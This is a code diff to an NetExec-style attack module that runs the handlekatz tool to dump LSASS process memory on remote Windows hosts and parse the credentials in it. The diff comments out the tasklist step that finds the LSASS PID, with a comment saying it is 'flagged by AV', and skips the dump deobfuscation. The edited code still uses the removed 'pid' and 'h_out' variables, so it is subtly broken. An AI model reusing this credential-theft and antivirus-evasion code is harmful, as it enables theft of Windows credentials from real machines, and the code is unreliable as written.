@@ -68,20 +68,20 @@ class NXCModule:
             except Exception as e:
                 context.log.fail(f"Error writing file to share {self.share}: {e}")
 
-        # get LSASS PID via `tasklist`
-        command = 'tasklist /v /fo csv | findstr /i "lsass"'
-        context.log.display(f"Getting lsass PID via command {command}")
-        p = connection.execute(command, True)
-        context.log.debug(f"Command Result: {p}")
-        if len(p) == 1:
-            p = p[0]
+        # get LSASS PID via `tasklist` (flagged by AV)
+        #command = 'tasklist /v /fo csv | findstr /i "lsass"'
+        #context.log.display(f"Getting lsass PID via command {command}")
+        #p = connection.execute(command, True)
+        #context.log.debug(f"Command Result: {p}")
+        #if len(p) == 1:
+        #    p = p[0]
 
-        if not p or p == "None":
-            context.log.fail("Failed to execute command to get LSASS PID")
-            return
+        #if not p or p == "None":
+        #    context.log.fail("Failed to execute command to get LSASS PID")
+        #    return
         # we get a CSV string back from `tasklist`, so we grab the PID from it
-        pid = p.split(",")[1][1:-1]
-        context.log.debug(f"pid: {pid}")
+        #pid = p.split(",")[1][1:-1]
+        #context.log.debug(f"pid: {pid}")
 
         command = self.tmp_dir + self.handlekatz + " --pid:" + pid + " --outfile:" + self.tmp_dir + "%COMPUTERNAME%-%PROCESSOR_ARCHITECTURE%-%USERDOMAIN%.log"
         context.log.display(f"Executing command {command}")
@@ -126,12 +126,12 @@ class NXCModule:
                 context.log.fail(f"[OPSEC] Error deleting lsass.dmp file on share {self.share}: {e}")
 
             h_in = open(self.dir_result + machine_name, "rb")  # noqa: SIM115
-            h_out = open(self.dir_result + machine_name + ".decode", "wb")  # noqa: SIM115
+            #h_out = open(self.dir_result + machine_name + ".decode", "wb")  # noqa: SIM115
 
             bytes_in = bytearray(h_in.read())
             bytes_in_len = len(bytes_in)
 
-            context.log.display(f"Deobfuscating, this might take a while (size: {bytes_in_len} bytes)")
+            context.log.display(f"Deobfuscating skipped in this custom version => Dump size: {bytes_in_len} bytes)")
 
             chunks = [bytes_in[i: i + 1000000] for i in range(0, bytes_in_len, 1000000)]
             for chunk in chunks:
@@ -140,7 +140,7 @@ class NXCModule:
 
                 h_out.write(bytes(chunk))
 
-            with open(self.dir_result + machine_name + ".decode", "rb") as dump:
+            with open(self.dir_result + machine_name, "rb") as dump:
                 try:
                     credz_bh = []
                     try:
